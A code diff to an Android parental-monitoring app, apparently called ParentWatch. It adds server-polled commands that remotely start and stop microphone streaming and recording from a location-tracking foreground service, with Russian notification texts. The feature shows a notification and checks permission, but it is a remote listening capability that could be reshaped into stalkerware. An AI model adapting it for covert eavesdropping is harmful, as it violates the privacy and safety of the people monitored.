@@ -19,9 +19,10 @@ import kotlinx.coroutines.*
 import ru.example.parentwatch.MainActivity
 import ru.example.parentwatch.R
 import ru.example.parentwatch.network.NetworkHelper
+import ru.example.parentwatch.audio.AudioStreamRecorder
 
 /**
- * Foreground service for continuous location tracking
+ * Foreground service for continuous location tracking and audio streaming
  */
 class LocationService : Service() {
 
@@ -31,6 +32,7 @@ class LocationService : Service() {
         private const val CHANNEL_ID = "location_tracking"
         private const val LOCATION_UPDATE_INTERVAL = 30000L // 30 seconds
         private const val LOCATION_FASTEST_INTERVAL = 15000L // 15 seconds
+        private const val COMMAND_CHECK_INTERVAL = 30000L // 30 seconds
 
         const val ACTION_START = "start"
         const val ACTION_STOP = "stop"
@@ -39,26 +41,33 @@ class LocationService : Service() {
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     private lateinit var locationCallback: LocationCallback
     private lateinit var networkHelper: NetworkHelper
+    private lateinit var audioRecorder: AudioStreamRecorder
     private lateinit var prefs: SharedPreferences
 
     private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
     private var isTracking = false
+    private var isStreamingAudio = false
     private var deviceId: String? = null
     private var serverUrl: String? = null
+    private var commandCheckJob: Job? = null
 
     override fun onCreate() {
         super.onCreate()
+        android.util.Log.d("ParentWatch", "LocationService onCreate called")
         Log.d(TAG, "Service created")
 
         prefs = getSharedPreferences("parentwatch_prefs", MODE_PRIVATE)
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         networkHelper = NetworkHelper(this)
+        audioRecorder = AudioStreamRecorder(this, networkHelper)
 
         createNotificationChannel()
         setupLocationCallback()
+        android.util.Log.d("ParentWatch", "LocationService onCreate completed")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        android.util.Log.d("ParentWatch", "onStartCommand: ${intent?.action}")
         Log.d(TAG, "onStartCommand: ${intent?.action}")
 
         when (intent?.action) {
@@ -162,6 +171,9 @@ class LocationService : Service() {
             Looper.getMainLooper()
         )
 
+        // Start command checking
+        startCommandChecking()
+
         Log.d(TAG, "Location updates started")
     }
 
@@ -221,10 +233,110 @@ class LocationService : Service() {
         notificationManager.notify(NOTIFICATION_ID, createNotification(text))
     }
 
+    /**
+     * Start periodic command checking
+     */
+    private fun startCommandChecking() {
+        commandCheckJob?.cancel()
+        commandCheckJob = serviceScope.launch {
+            while (isTracking) {
+                try {
+                    checkStreamingCommands()
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error checking commands", e)
+                }
+                delay(COMMAND_CHECK_INTERVAL)
+            }
+        }
+    }
+
+    /**
+     * Check for streaming commands from server
+     */
+    private suspend fun checkStreamingCommands() {
+        val deviceId = this.deviceId ?: return
+        val serverUrl = this.serverUrl ?: return
+
+        val commands = networkHelper.getStreamingCommands(serverUrl, deviceId)
+
+        for (command in commands) {
+            Log.d(TAG, "Processing command: ${command.type}")
+
+            when (command.type) {
+                "start_audio_stream" -> {
+                    startAudioStreaming(recording = false)
+                }
+                "stop_audio_stream" -> {
+                    stopAudioStreaming()
+                }
+                "start_recording" -> {
+                    audioRecorder.setRecordingMode(true)
+                    updateNotification("Запись аудио...")
+                }
+                "stop_recording" -> {
+                    audioRecorder.setRecordingMode(false)
+                    if (isStreamingAudio) {
+                        updateNotification("Прослушка активна")
+                    } else {
+                        updateNotification("Отслеживание активно")
+                    }
+                }
+            }
+        }
+    }
+
+    /**
+     * Start audio streaming
+     */
+    private fun startAudioStreaming(recording: Boolean) {
+        if (isStreamingAudio) {
+            Log.w(TAG, "Already streaming audio")
+            return
+        }
+
+        // Check permission
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.RECORD_AUDIO
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            Log.e(TAG, "Audio permission not granted")
+            return
+        }
+
+        val deviceId = this.deviceId ?: return
+        val serverUrl = this.serverUrl ?: return
+
+        audioRecorder.startStreaming(deviceId, serverUrl, recording)
+        isStreamingAudio = true
+
+        updateNotification("🎙️ Прослушка активна")
+        Log.d(TAG, "Audio streaming started")
+    }
+
+    /**
+     * Stop audio streaming
+     */
+    private fun stopAudioStreaming() {
+        if (!isStreamingAudio) {
+            return
+        }
+
+        audioRecorder.stopStreaming()
+        isStreamingAudio = false
+
+        updateNotification("Отслеживание активно")
+        Log.d(TAG, "Audio streaming stopped")
+    }
+
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
         super.onDestroy()
+        commandCheckJob?.cancel()
+        if (isStreamingAudio) {
+            stopAudioStreaming()
+        }
         fusedLocationClient.removeLocationUpdates(locationCallback)
         serviceScope.cancel()
         Log.d(TAG, "Service destroyed")
